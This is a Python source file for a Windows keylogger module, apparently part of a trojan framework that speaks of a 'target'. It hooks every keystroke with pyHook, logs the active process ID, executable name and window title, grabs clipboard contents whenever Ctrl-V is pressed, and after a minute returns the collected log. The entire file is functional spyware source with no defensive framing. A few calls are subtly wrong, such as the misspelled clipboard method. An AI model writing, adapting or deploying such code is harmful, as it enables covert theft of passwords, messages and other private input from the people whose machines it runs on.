import ctypes
import win32gui
import pyHook
import win32clipboard
import time
import sys

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32
psapi = ctypes.windll.psapi
current_window = None

print("[*] We are in KeyLogger Module")
global KeyLogs
KeyLogs = ""
start_time = time.time()
max_time = 60 # 1 minute


def get_current_process():
    global KeyLogs

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = ctypes.c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = ctypes.create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)

    # now read its title
    window_title = ctypes.create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)

    # print out the header if we're in the right process

    KeyLogs += ("[PID:] %s - %s - %s\n" % (process_id, executable.value, window_title.value))

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global KeyLogs
    global current_window

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # if they pressed a standard key
    if event.Ascii >= 32 and event.Ascii < 127:
        KeyLogs += (chr(event.Ascii))
    else:
        # if [Ctrl-V], get the value on the clipboard
        if event.Key == "V":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipBoardData()
            win32clipboard.CloseClipboard()

            KeyLogs += ("[PASTE] - %s\n" % (pasted_value))

        else:
            KeyLogs += ("[%s]" % event.Key)
    if time.time() - start_time > max_time:
        ctypes.windll.user32.PostQuitMessage(0)
        return True
    # pass execution to next hook registered
    return True

def main():
    global KeyLogs
    # create and register a hook manager
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke

    # register the hook and execute forever
    kl.HookKeyboard()
    win32gui.PumpMessages()

    print(KeyLogs)
    return(KeyLogs)

main()
